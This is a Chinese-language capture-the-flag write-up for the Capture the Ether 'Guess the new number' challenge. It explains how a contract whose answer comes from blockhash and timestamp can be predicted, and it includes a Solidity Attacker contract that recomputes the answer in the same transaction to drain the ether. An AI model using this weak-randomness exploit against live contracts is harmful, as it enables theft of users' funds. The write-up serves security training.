# Guess the new number

## 题目描述

[原题链接](https://capturetheether.com/challenges/lotteries/guess-the-new-number/)

原题目要求 GuessTheNewNumberChallenge 合约的 ether 余额为 0。而调用 guess 并输入答案，如果答案等于使用 blockhash 以及 timestamp 通过 hash 生成的数，即可转移 2 ether 出去。

## 运行

**安装 Foundry**

根据[Foundry 官方文档](https://getfoundry.sh/)配置好运行环境。

**运行测试**

```sh
$ cd WTF-CTF

$ forge test -C src/Capture_the_Ether/Lotteries/Guess_the_new_number -vvv
```

## 功能简述

在 GuessTheNewNumberChallenge 合约中，answer 的构造使用了当前链上的状态，包括前一个区块的 hash 以及当前 timestamp。既然answer 的构造规则是公开的，我们可以部署一个新合约 Attacker，使用新合约来计算 answer 并调用 guess，这样因为在这笔跨合约调用的 transaction 中，两个合约的环境变量 block hash 和 timestamp 都是相同的，因此能够得到相同的 answer。

这个是 Attacker 合约中 attack 的逻辑，我们先检查 msg.sender，防止被 MEV 黑吃黑了，然后我们调用 attack 时需要携带 1 ether，然后我们构造出 answer，并按照要求调用 GuessTheNewNumberChallenge 合约的 guess，然后通过 challenge.isComplete() 检查是否挑战成功，这样即使挑战失败，也不会损失 ether，最后将得到的余额返回给自己。

```solidity
    function attack(address _challenge) public payable {
        if (msg.sender != owner) revert NotOwner();
        if (msg.value != 1 ether) revert ValueErr();

        IGuessTheNewNumberChallenge challenge = IGuessTheNewNumberChallenge(_challenge);
        uint8 answer = uint8(uint(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);
        
        if (!challenge.isComplete()) revert GuessErr();

        payable(msg.sender).transfer(address(this).balance);        
    }
```
